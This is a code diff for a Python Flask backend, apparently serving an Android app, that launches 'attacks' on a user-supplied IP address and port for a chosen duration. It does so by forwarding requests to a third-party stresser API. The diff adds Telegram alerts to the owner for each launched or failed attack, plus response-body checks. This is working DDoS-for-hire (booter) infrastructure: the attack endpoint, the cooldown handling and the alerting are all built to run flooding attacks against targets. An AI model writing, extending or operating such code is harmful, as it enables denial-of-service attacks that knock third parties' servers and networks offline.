@@ -5,9 +5,11 @@ import time
 import os
 import threading
 import gc
+import re
 from datetime import datetime
 from pymongo import MongoClient
 from dotenv import load_dotenv
+import telebot
 
 load_dotenv()
 
@@ -24,6 +26,8 @@ RETROSTRESS_API_URL = os.environ.get('RETROSTRESS_API_URL')
 RETROSTRESS_API_KEY = os.environ.get('RETROSTRESS_API_KEY')
 MONGODB_URI = os.environ.get('MONGODB_URI')
 DATABASE_NAME = os.environ.get('DATABASE_NAME')
+BOT_TOKEN = os.environ.get('BOT_TOKEN')
+OWNER_ID = int(os.environ.get('OWNER_ID', 0))
 
 if not RETROSTRESS_API_URL:
     log("❌ ERROR: RETROSTRESS_API_URL not set!", "ERROR")
@@ -38,6 +42,22 @@ if not MONGODB_URI:
     exit(1)
 
 log(f"📋 RetroStress API URL: {RETROSTRESS_API_URL}")
+
+# Initialize Bot for notifications
+bot = None
+if BOT_TOKEN:
+    try:
+        bot = telebot.TeleBot(BOT_TOKEN)
+        log("✅ Notification Bot initialized")
+    except Exception as e:
+        log(f"⚠️ Failed to initialize notification bot: {e}", "WARNING")
+
+def send_owner_alert(msg):
+    if bot and OWNER_ID:
+        try:
+            bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
+        except Exception as e:
+            log(f"⚠️ Failed to send owner alert: {e}", "WARNING")
 
 # ========== MONGODB CONNECTION ==========
 try:
@@ -401,36 +421,67 @@ def attack_endpoint():
                 response = requests.get(RETROSTRESS_API_URL, params=params, timeout=30)
             elapsed = time.time() - start_time
             
-            if response.status_code == 200 or response.status_code == 201:
+            # Check if response is actually successful
+            is_success = False
+            api_res_text = response.text[:1000].replace('`', '')
+            
+            if response.status_code in [200, 201]:
+                # Some APIs return 200 even on error, check response body
+                error_keywords = ["error", "failed", "denied", "invalid", "limit reached", "balance"]
+                if not any(keyword in api_res_text.lower() for keyword in error_keywords):
+                    is_success = True
+            
+            if is_success:
                 start_attack(device_id, duration, ip, port)
                 set_cooldown(device_id)
                 log(f"✅ Attack SUCCESS | Time: {elapsed:.2f}s")
+                
+                # Optional: log success to owner too if needed
+                # Extract links for success too
+                links = re.findall(r'(https?://[^\s<>"]+|www\.[^\s<>"]+)', api_res_text)
+                link_text = "\n🔗 **Links Found:**\n" + "\n".join([f"• {l}" for l in links]) if links else ""
+                
+                send_owner_alert(f"ℹ️ **Attack Launched (APK)**\n👤 Device: `{device_id_short}...`\n🎯 Target: `{ip}:{port}`\n⏱️ Duration: `{duration}s`\n📝 API Response: `{api_res_text}`{link_text}")
+                
                 return jsonify({
                     "success": True, 
                     "message": f"💥 Attack started on {ip}:{port} for {duration} seconds",
                     "duration": duration
                 }), 200
             else:
-                log(f"❌ RetroStress API returned {response.status_code}")
-                log(f"   Response: {response.text[:200]}")
+                log(f"❌ API Error Detected | Status: {response.status_code}")
+                log(f"   Response: {api_res_text[:200]}")
+                
+                # Extract any links from response
+                links = re.findall(r'(https?://[^\s<>"]+|www\.[^\s<>"]+)', api_res_text)
+                link_text = "\n🔗 **Links Found:**\n" + "\n".join([f"• {l}" for l in links]) if links else ""
+                
+                send_owner_alert(f"⚠️ **API Request Failed (APK)**\n\n👤 Device: `{device_id_short}...`\n🎯 Target: `{ip}:{port}`\n⏱️ Duration: `{duration}s`\n🚫 Status: `{response.status_code}`\n\n📝 **Response:**\n`{api_res_text}`{link_text}")
+                
                 return jsonify({"success": False, "reason": f"API error: {response.status_code}"}), response.status_code
                 
         except requests.exceptions.Timeout:
             elapsed = time.time() - start_time
             log(f"⏰ API TIMEOUT after {elapsed:.2f}s", "ERROR")
+            send_owner_alert(f"⏰ **API Timeout (APK)**\n\nTarget: `{ip}:{port}`\nDuration: `{duration}s`")
             return jsonify({"success": False, "reason": "API timeout"}), 504
             
         except requests.exceptions.ConnectionError as e:
             elapsed = time.time() - start_time
             log(f"🔌 API CONNECTION ERROR after {elapsed:.2f}s: {e}", "ERROR")
+            send_owner_alert(f"🔌 **API Connection Error (APK)**\n\nTarget: `{ip}:{port}`\nError: `{str(e)}`")
             return jsonify({"success": False, "reason": "Cannot connect to API"}), 503
             
-    except Exception as e:
-        elapsed = time.time() - start_time
-        log(f"💥 UNEXPECTED ERROR after {elapsed:.2f}s: {type(e).__name__}: {e}", "ERROR")
-        import traceback
-        traceback.print_exc()
-        return jsonify({"success": False, "reason": "Internal server error"}), 500
+        except Exception as e:
+            elapsed = time.time() - start_time
+            log(f"💥 UNEXPECTED ERROR after {elapsed:.2f}s: {type(e).__name__}: {e}", "ERROR")
+            import traceback
+            traceback_print = traceback.format_exc()
+            print(traceback_print)
+            
+            send_owner_alert(f"🚨 **Critical Server Error**\n\nDevice: `{device_id_short}...`\nError: `{str(e)}`\nTraceback: ```\n{traceback_print[:500]}\n```")
+            
+            return jsonify({"success": False, "reason": "Internal server error"}), 500
 
 @app.route('/api/logout', methods=['POST'])
 def logout_endpoint():
